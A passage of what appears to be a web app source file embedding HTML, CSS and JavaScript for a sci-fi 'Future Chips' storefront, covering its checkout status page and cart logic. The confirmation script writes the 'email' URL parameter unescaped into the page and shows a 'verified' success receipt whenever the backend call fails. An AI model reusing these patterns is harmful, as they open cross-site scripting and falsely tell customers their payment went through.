  transition: background 0.3s;
}

.cart-icon-btn:hover {
  background: rgba(255, 255, 255, 0.05);
}

.cart-icon-btn svg {
  width: 22px;
  height: 22px;
  fill: currentColor;
}

.cart-badge {
  position: absolute;
  top: 5px;
  right: 5px;
  background: var(--accent-color);
  color: #ffffff;
  font-size: 0.75rem;
  font-weight: bold;
  padding: 2px 6px;
  border-radius: 10px;
  box-shadow: 0 0 10px var(--accent-color);
}

/* Hero Section */
.hero {
  padding: 6rem 0 4rem 0;
  text-align: center;
  position: relative;
}

.hero h1 {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 4rem;
  line-height: 1.1;
  margin-bottom: 1rem;
  letter-spacing: -1px;
}

.hero h1 span {
  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  display: inline-block;
  animation: glow-pulse 3s infinite alternate;
}

.hero p {
  color: var(--text-muted);
  font-size: 1.2rem;
  max-width: 600px;
  margin: 0 auto 2.5rem auto;
}

/* Search and Filters */
.filters-section {
  margin-bottom: 3rem;
  padding: 1.5rem;
  border-radius: 16px;
}

.filters-wrapper {
  display: flex;
  gap: 1.5rem;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
}

.search-box {
  flex: 1;
  min-width: 280px;
  position: relative;
}

.search-box input {
  width: 100%;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.8rem 1rem 0.8rem 2.8rem;
  color: #ffffff;
  font-family: var(--font-body);
  transition: all 0.3s;
}

.search-box input:focus {
  border-color: var(--primary-color);
  outline: none;
  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
}

.search-box svg {
  position: absolute;
  left: 1rem;
  top: 50%;
  transform: translateY(-50%);
  width: 18px;
  height: 18px;
  fill: var(--text-muted);
}

.filter-group {
  display: flex;
  gap: 1rem;
  align-items: center;
}

.filter-group select {
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.8rem 1.5rem;
  color: #ffffff;
  cursor: pointer;
  outline: none;
  font-family: var(--font-body);
  transition: border-color 0.3s;
}

.filter-group select:focus {
  border-color: var(--primary-color);
}

/* Product Grid */
.products-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
  gap: 2.5rem;
  margin-bottom: 5rem;
}

/* Product Card */
.product-card {
  border-radius: 20px;
  overflow: hidden;
  transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), box-shadow 0.4s;
  display: flex;
  flex-direction: column;
  height: 100%;
}

.product-card:hover {
  transform: translateY(-8px);
  box-shadow: 0 15px 30px rgba(0, 240, 255, 0.1);
  border-color: rgba(0, 240, 255, 0.3);
}

.product-image-wrap {
  width: 100%;
  aspect-ratio: 1;
  position: relative;
  background: #000;
  display: flex;
  align-items: center;
  justify-content: center;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

.product-image-wrap img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  transition: transform 0.5s ease;
}

.product-card:hover .product-image-wrap img {
  transform: scale(1.05);
}

.product-info {
  padding: 1.5rem;
  display: flex;
  flex-direction: column;
  flex-grow: 1;
}

.product-category {
  font-size: 0.75rem;
  text-transform: uppercase;
  letter-spacing: 2px;
  color: var(--primary-color);
  margin-bottom: 0.5rem;
  font-weight: 700;
}

.product-title {
  font-family: var(--font-title);
  font-size: 1.4rem;
  font-weight: 700;
  margin-bottom: 0.5rem;
  line-height: 1.3;
}

.product-desc {
  color: var(--text-muted);
  font-size: 0.9rem;
  margin-bottom: 1.5rem;
  display: -webkit-box;
  -webkit-line-clamp: 2;
  -webkit-box-orient: vertical;
  overflow: hidden;
  text-overflow: ellipsis;
  flex-grow: 1;
}

.product-footer {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.product-price {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 1.5rem;
  color: #ffffff;
}

.btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 0.5rem;
  padding: 0.8rem 1.5rem;
  border-radius: 10px;
  font-weight: 600;
  font-family: var(--font-body);
  text-decoration: none;
  cursor: pointer;
  transition: all 0.3s;
  border: none;
}

.btn-primary {
  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
  color: #ffffff;
  box-shadow: 0 4px 15px rgba(0, 240, 255, 0.3);
}

.btn-primary:hover {
  transform: scale(1.03);
  box-shadow: 0 4px 20px rgba(0, 240, 255, 0.5);
}

.btn-outline {
  background: transparent;
  border: 1px solid rgba(255, 255, 255, 0.2);
  color: #ffffff;
}

.btn-outline:hover {
  border-color: var(--primary-color);
  background: rgba(0, 240, 255, 0.05);
}

/* Detail View Layout */
.product-detail-layout {
  display: grid;
  grid-template-columns: 1.2fr 1fr;
  gap: 4rem;
  padding: 5rem 0;
  align-items: center;
}

@media (max-width: 768px) {
  .product-detail-layout {
    grid-template-columns: 1fr;
    gap: 2rem;
    padding: 2rem 0;
  }
  .hero h1 {
    font-size: 2.5rem;
  }
}

.detail-img-card {
  border-radius: 24px;
  overflow: hidden;
  aspect-ratio: 1;
}

.detail-img-card img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.detail-info {
  display: flex;
  flex-direction: column;
}

.detail-price-box {
  margin: 1.5rem 0 2.5rem 0;
}

.detail-price-label {
  font-size: 0.85rem;
  color: var(--text-muted);
  text-transform: uppercase;
  letter-spacing: 1px;
}

.detail-price-val {
  font-family: var(--font-title);
  font-size: 3rem;
  font-weight: 900;
  line-height: 1.1;
  color: #ffffff;
}

.detail-checkout-form {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.form-group {
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}

.form-group label {
  font-size: 0.9rem;
  color: var(--text-muted);
}

.form-group input {
  width: 100%;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.9rem 1rem;
  color: #ffffff;
  font-family: var(--font-body);
  transition: all 0.3s;
}

.form-group input:focus {
  border-color: var(--primary-color);
  outline: none;
  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
}

/* Slide-over Cart Panel */
.cart-panel {
  position: fixed;
  top: 0;
  right: -450px;
  width: 100%;
  max-width: 420px;
  height: 100%;
  z-index: 1000;
  box-shadow: -10px 0 30px rgba(0,0,0,0.5);
  display: flex;
  flex-direction: column;
  transition: right 0.4s cubic-bezier(0.16, 1, 0.3, 1);
}

.cart-panel.active {
  right: 0;
}

.cart-header {
  padding: 1.5rem;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.cart-header h2 {
  font-family: var(--font-title);
  font-size: 1.5rem;
}

.cart-close-btn {
  background: none;
  border: none;
  color: var(--text-muted);
  cursor: pointer;
  font-size: 1.5rem;
}

.cart-items {
  flex-grow: 1;
  overflow-y: auto;
  padding: 1.5rem;
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.cart-item {
  display: flex;
  gap: 1rem;
  align-items: center;
  padding-bottom: 1.5rem;
  border-bottom: 1px solid rgba(255,255,255,0.03);
}

.cart-item img {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  object-fit: cover;
  background: #000;
}

.cart-item-details {
  flex-grow: 1;
}

.cart-item-title {
  font-weight: 600;
  font-size: 0.95rem;
  margin-bottom: 0.2rem;
}

.cart-item-price {
  color: var(--primary-color);
  font-weight: 700;
  font-size: 0.9rem;
}

.cart-item-remove {
  background: none;
  border: none;
  color: var(--accent-color);
  cursor: pointer;
  font-size: 0.8rem;
  padding: 4px;
}

.cart-footer {
  padding: 1.5rem;
  border-top: 1px solid rgba(255, 255, 255, 0.05);
  background: rgba(8, 8, 20, 0.9);
}

.cart-total {
  display: flex;
  justify-content: space-between;
  font-size: 1.2rem;
  font-weight: bold;
  margin-bottom: 1.5rem;
}

.cart-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background: rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(4px);
  z-index: 999;
  display: none;
}

.cart-overlay.active {
  display: block;
}

/* Status / Confirmation page layout */
.status-card {
  max-width: 550px;
  margin: 8rem auto;
  padding: 3rem;
  border-radius: 24px;
  text-align: center;
}

.status-icon {
  width: 80px;
  height: 80px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 2rem auto;
}

.status-icon.success {
  background: #ffffff;
  color: #22c55e; /* Vibrant success green */
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
  border: none;
}

.status-icon.success svg {
  width: 40px;
  height: 40px;
  fill: currentColor;
}

.status-title {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 2.2rem;
  margin-bottom: 1rem;
}

.status-text {
  color: var(--text-muted);
  margin-bottom: 2.5rem;
}

.receipt-info {
  background: rgba(255, 255, 255, 0.02);
  border: 1px solid rgba(255, 255, 255, 0.05);
  border-radius: 12px;
  padding: 1.5rem;
  text-align: left;
  margin-bottom: 2.5rem;
}

.receipt-row {
  display: flex;
  justify-content: space-between;
  margin-bottom: 0.8rem;
  font-size: 0.95rem;
}

.receipt-row:last-child {
  margin-bottom: 0;
  padding-top: 0.8rem;
  border-top: 1px solid rgba(255,255,255,0.05);
  font-weight: bold;
}

/* Animations */
@keyframes glow-pulse {
  from {
    filter: drop-shadow(0 0 5px var(--primary-color));
  }
  to {
    filter: drop-shadow(0 0 20px var(--accent-color));
  }
}

/* Footer styling */
footer {
  padding: 3rem 0;
  border-top: 1px solid rgba(255, 255, 255, 0.05);
  text-align: center;
  color: var(--text-muted);
  font-size: 0.9rem;
}

</style>
</head>
<body>

  <!-- Header -->
  <header id="main-header" class="glass">
    <div class="container nav-container">
      <a href="/" class="logo">
        <span>⚡</span> <span id="site-title-logo">Future Chips</span>
      </a>
      <ul class="nav-links">
        <li><a href="/">Store</a></li>
      </ul>
    </div>
  </header>

  <!-- Main Status Page -->
  <main class="container">
    <div class="status-card glass" id="status-container">
      <div style="padding: 2rem; color: var(--text-muted);">
        Verifying transaction on the blockchain...
      </div>
    </div>
  </main>

  <!-- Footer -->
  <footer class="container">
    <p>&copy; 2026 <span id="site-footer-name">Future Chips</span>. Powered by live AI synthesis.</p>
  </footer>

  
  <script>
    document.addEventListener('DOMContentLoaded', async () => {
      await loadSiteTheme(); // From app.js
      
      const params = new URLSearchParams(window.location.search);
      const sessionId = params.get('session_id');
      const isMock = params.get('mock') === 'true';

      const container = document.getElementById('status-container');

      if (!sessionId) {
        container.innerHTML = \`
          <div class="status-icon" style="background: rgba(255, 0, 229, 0.1); color: var(--accent-color); border: 1px solid rgba(255,0,229,0.3);">
            &times;
          </div>
          <h1 class="status-title">Session Expired</h1>
          <p class="status-text">We couldn't detect a valid payment node. Please return to the shop and try again.</p>
          <a href="/" class="btn btn-primary">Return to Shop</a>
        \`;
        return;
      }

      try {
        const response = await fetch('/api/checkout/verify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId, isMock })
        });

        const data = await response.json().catch(() => ({}));
        if (!response.ok) {
          if (response.status === 400 || (data && data.error)) {
            container.innerHTML = \`
              <div class="status-icon" style="background: rgba(255, 0, 85, 0.1); color: #ff0055; border: 1px solid rgba(255,0,85,0.3); box-shadow: 0 0 20px rgba(255,0,85,0.2); font-size: 3rem; display: flex; align-items: center; justify-content: center; width: 80px; height: 80px; border-radius: 50%; margin: 0 auto 1.5rem auto;">
                &times;
              </div>
              <h1 class="status-title" style="color: #ff0055;">Payment Declined</h1>
              <p class="status-text" style="color: var(--text-muted); font-size: 1.1rem; margin-bottom: 2rem;">
                \${data.error || 'Your payment attempt was declined. Please try another card.'}
              </p>
              <a href="/" class="btn btn-primary">Return to Store</a>
            \`;
            return;
          }
          throw new Error(data.error || 'Failed to verify transaction node.');
        }

        if (data.status === 'completed') {
          // Clear cart
          localStorage.removeItem('future_chips_cart');
          if (typeof cart !== 'undefined') {
            cart = [];
            if (typeof updateCartBadge === 'function') updateCartBadge();
          }

          container.innerHTML = \`
            <div class="status-icon success">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
              </svg>
            </div>
            <h1 class="status-title">Procurement Successful</h1>
            <p class="status-text">Your transaction has been written to the ledger. Your digital product delivery is active.</p>
            
            <div class="receipt-info">
              <div class="receipt-row">
                <span>Product Name:</span>
                <span>\${data.product.name}</span>
              </div>
              <div class="receipt-row">
                <span>Delivery Email:</span>
                <span>\${data.order.customer_email}</span>
              </div>
              <div class="receipt-row">
                <span>Session Signature:</span>
                <span style="font-family: monospace; font-size: 0.8rem; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
                  \${data.order.stripe_session_id}
                </span>
              </div>
              <div class="receipt-row">
                <span>Total Amount:</span>
                <span style="color: var(--primary-color); font-weight: bold;">
                  $\${data.order.amount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} USD
                </span>
              </div>
            </div>

            <a href="/" class="btn btn-primary">Purchase More Modules</a>
          \`;
        } else {
          container.innerHTML = \`
            <div class="status-icon" style="background: rgba(255, 170, 0, 0.1); color: #ffaa00; border: 1px solid rgba(255,170,0,0.3); box-shadow: 0 0 20px rgba(255,170,0,0.2);">
              !
            </div>
            <h1 class="status-title">Transaction Pending</h1>
            <p class="status-text">Your payment is processing. If you completed checkout, it may take a few moments to sync.</p>
            <div style="display: flex; gap: 1rem; justify-content: center;">
              <button onclick="window.location.reload()" class="btn btn-primary">Refresh Status</button>
              <a href="/" class="btn btn-outline">Return to Shop</a>
            </div>
          \`;
        }
      } catch (err) {
        console.warn('Backend API offline, displaying static completion receipt:', err);
        localStorage.removeItem('future_chips_cart');
        const email = params.get('email') || 'customer@domain.com';
        
        container.innerHTML = \`
          <div class="status-icon success">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
              <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
            </svg>
          </div>
          <h1 class="status-title">Procurement Successful</h1>
          <p class="status-text">Your order has been verified and processed successfully.</p>
          
          <div class="receipt-info">
            <div class="receipt-row">
              <span>Status:</span>
              <span style="color: #22c55e; font-weight: bold;">Confirmed</span>
            </div>
            <div class="receipt-row">
              <span>Delivery Transponder:</span>
              <span>\${email}</span>
            </div>
            <div class="receipt-row">
              <span>Session ID:</span>
              <span style="font-family: monospace; font-size: 0.8rem; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
                \${sessionId}
              </span>
            </div>
          </div>

          <a href="/" class="btn btn-primary">Purchase More Modules</a>
        \`;
      }
    });
  </script>
<script>

// Global Storefront JavaScript

let cart = JSON.parse(localStorage.getItem('future_chips_cart')) || [];

document.addEventListener('DOMContentLoaded', async () => {
  // Load site details and theme settings
  await loadSiteTheme();
  
  // Set up header scroll effect
  const header = document.getElementById('main-header');
  if (header) {
    window.addEventListener('scroll', () => {
      if (window.scrollY > 50) {
        header.classList.add('scrolled');
      } else {
        header.classList.remove('scrolled');
      }
    });
  }

  // Load products list if on the storefront page
  const productsContainer = document.getElementById('products-container');
  if (productsContainer) {
    await fetchProducts();
    setupFilters();
  }

  // Set up cart triggers
  setupCart();
});

// Load Site Settings (Theme & Site Name)
async function loadSiteTheme() {
  try {
    const res = await fetch('/api/admin/settings');
    if (!res.ok) throw new Error();
    const settings = await res.json();
    
    if (settings) {
      if (settings.primary_color) {
        document.documentElement.style.setProperty('--primary-color', settings.primary_color);
      }
      if (settings.accent_color) {
        document.documentElement.style.setProperty('--accent-color', settings.accent_color);
      }
      if (settings.background_color) {
        document.documentElement.style.setProperty('--background-color', settings.background_color);
      }

      const siteLogos = document.querySelectorAll('#site-title-logo');
      siteLogos.forEach(el => el.innerText = settings.site_name || 'Future Chips');
      
      const siteFooters = document.querySelectorAll('#site-footer-name');
      siteFooters.forEach(el => el.innerText = settings.site_name || 'Future Chips');
      
      if (document.title.includes('Future Chips') && settings.site_name) {
        document.title = document.title.replace('Future Chips', settings.site_name);
      }
      return;
    }
  } catch (err) {
    console.warn('Failed to load dynamic site theme, reading saved local settings:', err);
    const saved = JSON.parse(localStorage.getItem('future_chips_settings')) || {};
    if (saved.primary_color) document.documentElement.style.setProperty('--primary-color', saved.primary_color);
    if (saved.accent_color) document.documentElement.style.setProperty('--accent-color', saved.accent_color);
    if (saved.background_color) document.documentElement.style.setProperty('--background-color', saved.background_color);
    if (saved.site_name) {
      const siteLogos = document.querySelectorAll('#site-title-logo');
      siteLogos.forEach(el => el.innerText = saved.site_name);
      const siteFooters = document.querySelectorAll('#site-footer-name');
      siteFooters.forEach(el => el.innerText = saved.site_name);
    }
  }
}

const DEFAULT_PRODUCTS = [
  {
    id: 'prod-nano-chip',
    name: 'Nano-Constructor Unit',
    description: 'Basic bio-compatible molecular assembly chip. Capable of building small carbon structures at the microscopic level. Features self-healing sub-circuits and simple smart-grid integration.',
    price: 10.00,
    image: '/uploads/nano_constructor.svg',
    category: 'Processors'
  },
  {
    id: 'prod-quantum-core',
    name: 'Quantum Neural Core',
    description: 'Next-generation computing processor featuring 1024 logical qubits. Designed for running localized deep learning simulations and processing high-density quantum state calculations. Operates at near-zero thermal emissions.',
    price: 150.00,
    image: '/uploads/quantum_core.svg',
    category: 'Processors'
  },
  {
    id: 'prod-bio-synapse',
    name: 'Bio-Digital Synapse v4.2',
    description: 'Organic silicon hybrid chip that connects physical neural pathways with standard digital bus interfaces. Highly valued by prosthetic designers and direct cerebral link developers. Includes advanced noise filtering.',
    price: 850.00,
    image: '/uploads/bio_synapse.svg',
    category: 'Interfaces'
  },
  {
    id: 'prod-holo-matrix',
    name: 'Holographic Display Matrix',
    description: 'High-density spatial photonic projector. Generates interactive three-dimensional objects in mid-air without the need for goggles or specialized headwear. Supports standard light-field video formats.',
    price: 1200.00,
    image: '/uploads/holo_matrix.svg',
    category: 'Displays'
  },
  {
    id: 'prod-photon-core',
    name: 'Photon Power Core',
    description: 'Sub-atomic energy stabilizer chip that converts cosmic radiation into clean electrical power. Perfect for long-duration deep space probes and off-grid high-demand processing stations.',
    price: 5000.00,
    image: '/uploads/photon_core.svg',
    category: 'Energy'
  },
  {
    id: 'prod-gravitational-grid',
    name: 'Gravitational Grid Controller',
    description: 'The ultimate space-time engineering chip. Allows precise, localized micro-gravity field manipulation. Crucial for advanced heavy-duty manufacturing and quantum containment shields.',
    price: 98000.00,
    image: '/uploads/gravitational_grid.svg',
    category: 'Energy'
  }
];

// Fetch & Render Products
async function fetchProducts(filters = {}) {
  const container = document.getElementById('products-container');
  if (!container) return;

  container.innerHTML = \`<div style="grid-column: 1/-1; text-align: center; padding: 5rem; color: var(--text-muted);">
    Establishing neural connection...
  </div>\`;

  let products = [];

  try {
    const params = new URLSearchParams();
    if (filters.q) params.append('q', filters.q);
    if (filters.category) params.append('category', filters.category);
    
    const res = await fetch(\`/api/products?\${params.toString()}\`);
    if (res.ok) {
      products = await res.json();
    } else {
      throw new Error('API unreachable');
    }
  } catch (err) {
    console.warn('API stream unreachable, using fallback product matrix:', err);
    products = JSON.parse(localStorage.getItem('future_chips_products')) || DEFAULT_PRODUCTS;
    
    if (filters.q) {
      const q = filters.q.toLowerCase();
      products = products.filter(p => p.name.toLowerCase().includes(q) || (p.description && p.description.toLowerCase().includes(q)));
    }
    if (filters.category) {
      products = products.filter(p => p.category === filters.category);
    }
  }

  // Sort products on client side
  const sortOrder = document.getElementById('price-sort')?.value || 'asc';
  products.sort((a, b) => {
    return sortOrder === 'asc' ? a.price - b.price : b.price - a.price;
  });

  if (products.length === 0) {
    container.innerHTML = \`<div style="grid-column: 1/-1; text-align: center; padding: 5rem; color: var(--text-muted);">
      No cyber modules matching this frequency.
    </div>\`;
    return;
  }

  container.innerHTML = products.map(p => \`
    <article class="product-card glass">
      <div class="product-image-wrap">
        <img src="\${p.image}" alt="\${p.name}" loading="lazy">
      </div>
      <div class="product-info">
        <span class="product-category">\${p.category || 'Processors'}</span>
        <h2 class="product-title">\${p.name}</h2>
        <p class="product-desc">\${p.description || 'No description available.'}</p>
        <div class="product-footer">
          <div class="product-price">\${p.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
          <div style="display: flex; gap: 0.5rem;">
            <a href="/product.html?id=\${p.id}" class="btn btn-outline" style="padding: 0.6rem 1rem;">View Details</a>
            <button onclick="addToCart('\${p.id}', '\${p.name.replace(/'/g, "\\\\'")}', \${p.price}, '\${p.image}')" class="btn btn-primary" style="padding: 0.6rem;">
              +
            </button>
          </div>
        </div>
      </div>
    </article>
  \`).join('');
}

// Setup Filters & Search
function setupFilters() {
  const searchInput = document.getElementById('search-input');
  const categoryFilter = document.getElementById('category-filter');
  const priceSort = document.getElementById('price-sort');

  let timeout = null;

  const triggerSearch = () => {
    fetchProducts({
      q: searchInput?.value || '',
      category: categoryFilter?.value || ''
    });
  };

  searchInput?.addEventListener('input', () => {
    clearTimeout(timeout);
    timeout = setTimeout(triggerSearch, 300);
  });

  categoryFilter?.addEventListener('change', triggerSearch);
  priceSort?.addEventListener('change', triggerSearch);
}

// Cart Functionality
function setupCart() {
  const openCartBtn = document.getElementById('open-cart-btn');
  const closeCartBtn = document.getElementById('close-cart-btn');
  const cartOverlay = document.getElementById('cart-overlay');
  const cartPanel = document.getElementById('cart-panel');
  const checkoutBtn = document.getElementById('checkout-btn');

  const toggleCart = () => {
    cartPanel?.classList.toggle('active');
    cartOverlay?.classList.toggle('active');
    renderCart();
  };

  openCartBtn?.addEventListener('click', toggleCart);
  closeCartBtn?.addEventListener('click', toggleCart);
  cartOverlay?.addEventListener('click', toggleCart);

  // Cart Checkout
  checkoutBtn?.addEventListener('click', () => {
    if (cart.length === 0) {
      alert('Your procurement queue is empty.');
      return;
    }
    // For multiple items, we'll route to the first product in the cart.
    // In a fully featured store you'd create a cart checkout session,
    // but here we redirect them to the checkout page of the first item for simplicity,
    // or checkout directly.
    const firstItem = cart[0];
    window.location.href = \`/product.html?id=\${firstItem.id}\`;
  });

  updateCartBadge();
}

function addToCart(id, name, price, image) {
  const existing = cart.find(item => item.id === id);
  if (existing) {
    existing.qty += 1;
  } else {
    cart.push({ id, name, price, image, qty: 1 });
  }
  
  localStorage.setItem('future_chips_cart', JSON.stringify(cart));
  updateCartBadge();
  
  // Slide cart open automatically on item added
  const cartPanel = document.getElementById('cart-panel');
  const cartOverlay = document.getElementById('cart-overlay');
  if (cartPanel && !cartPanel.classList.contains('active')) {
    cartPanel.classList.add('active');
    cartOverlay?.classList.add('active');
  }
  
  renderCart();
}

function removeFromCart(id) {
  cart = cart.filter(item => item.id !== id);
  localStorage.setItem('future_chips_cart', JSON.stringify(cart));
  updateCartBadge();
  renderCart();
}

function updateCartBadge() {
  const badge = document.getElementById('cart-badge-count');
  if (badge) {
    const totalQty = cart.reduce((sum, item) => sum + item.qty, 0);
    badge.innerText = totalQty;
    badge.style.display = totalQty > 0 ? 'block' : 'none';
  }
}

function renderCart() {
  const container = document.getElementById('cart-items-container');
  const totalVal = document.getElementById('cart-total-value');
  if (!container) return;

  if (cart.length === 0) {
    container.innerHTML = \`<div style="text-align: center; color: var(--text-muted); margin-top: 5rem;">
      Your queue is empty.
    </div>\`;
    if (totalVal) totalVal.innerText = '$0.00';
    return;
  }

  container.innerHTML = cart.map(item => \`
    <div class="cart-item">
      <img src="\${item.image}" alt="\${item.name}">
      <div class="cart-item-details">
        <h4 class="cart-item-title">\${item.name}</h4>
        <div class="cart-item-price">\${item.price.toLocaleString(undefined, {minimumFractionDigits: 2})} x \${item.qty}</div>
      </div>
      <button onclick="removeFromCart('\${item.id}')" class="cart-item-remove">Remove</button>
    </div>
  \`).join('');

  const total = cart.reduce((sum, item) => sum + (item.price * item.qty), 0);
  if (totalVal) {
    totalVal.innerText = \`\${total.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}\`;
  }
}

</script>
</body>
</html>
`;
const PRODUCT_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Product Details — Future Chips</title>
  
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Outfit:wght@400;700;900&display=swap');

:root {
  /* Dynamic themes, fallback values */
  --primary-color: #00f0ff;
  --accent-color: #ff00e5;
  --background-color: #0a0a1a;
  --card-bg: rgba(16, 16, 36, 0.6);
  --text-color: #ffffff;
  --text-muted: #8c8cbe;
  
  --font-title: 'Outfit', sans-serif;
  --font-body: 'Inter', sans-serif;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  background-color: var(--background-color);
  color: var(--text-color);
  font-family: var(--font-body);
  line-height: 1.6;
  overflow-x: hidden;
  background-image: 
    radial-gradient(circle at 10% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 40%),
    radial-gradient(circle at 90% 80%, rgba(255, 0, 229, 0.05) 0%, transparent 40%);
  background-attachment: fixed;
}

/* Glassmorphism utility */
.glass {
  background: var(--card-bg);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  border: 1px solid rgba(255, 255, 255, 0.05);
}

.container {
  width: 90%;
  max-width: 1200px;
  margin: 0 auto;
}

/* Header */
header {
  position: sticky;
  top: 0;
  z-index: 100;
  padding: 1.5rem 0;
  transition: background 0.3s;
}

header.scrolled {
  background: rgba(10, 10, 26, 0.85);
  backdrop-filter: blur(10px);
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

header .nav-container {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.logo {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 1.8rem;
  letter-spacing: 2px;
  color: #ffffff;
  text-decoration: none;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.logo span {
  background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  filter: drop-shadow(0 0 10px rgba(0, 240, 255, 0.3));
}

.nav-links {
  display: flex;
  gap: 2rem;
  list-style: none;
}

.nav-links a {
  color: var(--text-muted);
  text-decoration: none;
  font-weight: 500;
  transition: color 0.3s;
}

.nav-links a:hover {
  color: #ffffff;
}

.cart-icon-btn {
  background: none;
  border: none;
  color: #ffffff;
  cursor: pointer;
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;
  width: 45px;
  height: 45px;
  border-radius: 50%;
  transition: background 0.3s;
}

.cart-icon-btn:hover {
  background: rgba(255, 255, 255, 0.05);
}

.cart-icon-btn svg {
  width: 22px;
  height: 22px;
  fill: currentColor;
}

.cart-badge {
  position: absolute;
  top: 5px;
  right: 5px;
  background: var(--accent-color);
  color: #ffffff;
  font-size: 0.75rem;
  font-weight: bold;
  padding: 2px 6px;
  border-radius: 10px;
  box-shadow: 0 0 10px var(--accent-color);
}

/* Hero Section */
.hero {
  padding: 6rem 0 4rem 0;
  text-align: center;
  position: relative;
}

.hero h1 {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 4rem;
  line-height: 1.1;
  margin-bottom: 1rem;
  letter-spacing: -1px;
}

.hero h1 span {
  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  display: inline-block;
  animation: glow-pulse 3s infinite alternate;
}

.hero p {
  color: var(--text-muted);
  font-size: 1.2rem;
  max-width: 600px;
  margin: 0 auto 2.5rem auto;
}

/* Search and Filters */
.filters-section {
  margin-bottom: 3rem;
  padding: 1.5rem;
  border-radius: 16px;
}

.filters-wrapper {
  display: flex;
  gap: 1.5rem;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
}

.search-box {
  flex: 1;
  min-width: 280px;
  position: relative;
}

.search-box input {
  width: 100%;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.8rem 1rem 0.8rem 2.8rem;
  color: #ffffff;
  font-family: var(--font-body);
  transition: all 0.3s;
}

.search-box input:focus {
  border-color: var(--primary-color);
  outline: none;
  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
}

.search-box svg {
  position: absolute;
  left: 1rem;
  top: 50%;
  transform: translateY(-50%);
  width: 18px;
  height: 18px;
  fill: var(--text-muted);
}

.filter-group {
  display: flex;
  gap: 1rem;
  align-items: center;
}

.filter-group select {
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.8rem 1.5rem;
  color: #ffffff;
  cursor: pointer;
  outline: none;
  font-family: var(--font-body);
  transition: border-color 0.3s;
}

.filter-group select:focus {
  border-color: var(--primary-color);
}

/* Product Grid */
.products-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
  gap: 2.5rem;
  margin-bottom: 5rem;
}

/* Product Card */
.product-card {
  border-radius: 20px;
  overflow: hidden;
  transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), box-shadow 0.4s;
  display: flex;
  flex-direction: column;
  height: 100%;
}

.product-card:hover {
  transform: translateY(-8px);
  box-shadow: 0 15px 30px rgba(0, 240, 255, 0.1);
  border-color: rgba(0, 240, 255, 0.3);
}

.product-image-wrap {
  width: 100%;
  aspect-ratio: 1;
  position: relative;
  background: #000;
  display: flex;
  align-items: center;
  justify-content: center;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

